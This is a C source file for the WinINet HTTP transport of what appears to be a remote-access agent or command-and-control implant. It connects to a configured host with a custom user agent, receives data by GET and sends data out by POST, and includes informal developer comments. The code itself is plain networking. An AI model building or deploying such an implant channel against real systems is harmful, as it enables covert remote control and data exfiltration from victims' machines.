#include "agent.h"
#include <wininet.h>

// Initialies UserAgent & the connection to the server
// which is then subsequentially passed to the Open
// Network Server. I think I might need to change InternetConnectA
// to wininet_request(), off memory...
INT wininet_init(struct Cobol *c)
{
    HANDLE hInternet = InternetOpenA((PCHAR)&c->Config->UserAgent,
	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(hInternet != NULL)
    {
	HANDLE hNetwork = InternetConnectA(hInternet, &c->Config->Host,
		c->Config->Port, NULL, NULL, INTERNET_SERVICE_HTTP,
		0, 0);
	if ( hNetwork != NULL ) {
	    c->HttpTransport->hInternetConfig     = hInternet;
	    c->HttpTransport->hInternetConnection = hNetwork;
	    return 0;
	}
	InternetCloseHandle(hInternet);
    }
    return 1;
}

// 90% feel like I'm going to change this, but, we'll see. Probably
// to include HTTPS & Fix up some other stuff & add header parsing
// etc.
// Currently opens an request to the path defined in Configuration.
// using wininet's HttpOpenRequestA()
BOOL wininet_request(struct Cobol *c, BOOL Method, PCHAR *Data, PDWORD Length)
{
    BOOL ReturnValue = FALSE;
    // Maybe allow data being sent from GET and recieved from POST (rather then GET = recv & POST = send) ?.
    // Not sure at the moment. Keep as is for now.
    HANDLE hNetworkRequest = HttpOpenRequestA(c->HttpTransport->hInternetConnection, Method ? "GET" : "POST",
	(PCHAR)&c->Config->Path, NULL, NULL, NULL,
	INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_UI |INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 0);
    if(hNetworkRequest != NULL)
    {
	if ( Method ) {
		ReturnValue = HttpSendRequestA(hNetworkRequest, NULL, 0, NULL, 0);
		if ( ReturnValue != FALSE ) {
			DWORD BytesRead = 0;
			InternetQueryDataAvailable(hNetworkRequest, Length, 0, 0);
			*Data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *Length);
			InternetReadFile(hNetworkRequest, *Data, *Length, &BytesRead);
		}
	}
	else {
		ReturnValue = HttpSendRequestA(hNetworkRequest, NULL, 0, *Data, *Length);
	};
	InternetCloseHandle(hNetworkRequest);
    };
    return ReturnValue;
}

VOID WininetConfigureCallback(struct Cobol *c)
{
    c->HttpTransport->init    = (void *)wininet_init;
    c->HttpTransport->request = (void *)wininet_request;
    return;
}
